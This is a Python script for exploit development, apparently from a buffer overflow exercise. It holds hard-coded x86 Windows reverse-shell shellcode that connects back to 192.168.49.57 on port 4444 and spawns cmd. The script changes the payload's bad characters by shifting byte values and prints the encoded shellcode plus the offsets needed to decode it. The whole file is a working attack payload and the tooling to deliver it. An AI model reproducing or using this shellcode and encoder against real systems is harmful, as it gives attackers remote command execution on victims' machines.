
increment = True

bad_chars = b"\x00\x0A\x11\x20\x28\x80\x81\x86"

rev_shell =  b""
rev_shell += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
rev_shell += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
rev_shell += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
rev_shell += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
rev_shell += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
rev_shell += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
rev_shell += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
rev_shell += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
rev_shell += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
rev_shell += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
rev_shell += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
rev_shell += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
rev_shell += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
rev_shell += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"
rev_shell += b"\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
rev_shell += b"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40"
rev_shell += b"\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97"
rev_shell += b"\x6a\x05\x68\xc0\xa8\x31\x39\x68\x02\x00\x11"
rev_shell += b"\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74"
rev_shell += b"\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75"
rev_shell += b"\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d"
rev_shell += b"\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12"
rev_shell += b"\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01"
rev_shell += b"\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
rev_shell += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc"
rev_shell += b"\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
rev_shell += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2"
rev_shell += b"\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
rev_shell += b"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f"
rev_shell += b"\x6a\x00\x53\xff\xd5"


def encode_byte(byte):
    if increment:
        byte += 1
    else:
        byte -= 1
    byte &= 0xFF
    return byte

def print_shell(encoded_shell):
    output = "rev_shell =  b\"\"\n"
    for i in range(0, len(encoded_shell), 11):
        printed_bytes = ""
        for byte in encoded_shell[i:(i+11)]:
            printed_bytes += "\\x{0:02x}".format(byte)
        output += "rev_shell += b\"" + printed_bytes + "\"\n"
    print(output)

def print_encoding_info(encoded_info):
    # Print in code-copyable  format
    entries = []
    for entry in encoded_info:
        (index, _, iterations) = entry
        entries.append("(" + str(index) + "," + str(iterations) + ")")
    print("[" + ",".join(entries) + "]")
    print()

    # Print in human readable format
    action = "decremented"
    if increment:
        action = "incremented"

    for entry in encoded_info:
        (index, byte, iterations) = entry
        print("Byte at index " +
              str(index) +
              " (" +
              "\\x{0:02x}".format(byte) +
              ")" +
              " was " +
              action +
              " " +
              str(iterations) + " times")

encoded_shell = bytearray()
encoding_info = []

for i in range(0, len(rev_shell)):
    byte = rev_shell[i]
    if byte in bad_chars:
        j = 0
        while byte in bad_chars:
            byte = encode_byte(byte)
            j += 1
        # Byte at index i (byte) was shifted j times
        encoding_info.append((i, byte, j))
    encoded_shell.append(byte)

print_shell(encoded_shell)
print_encoding_info(encoding_info)

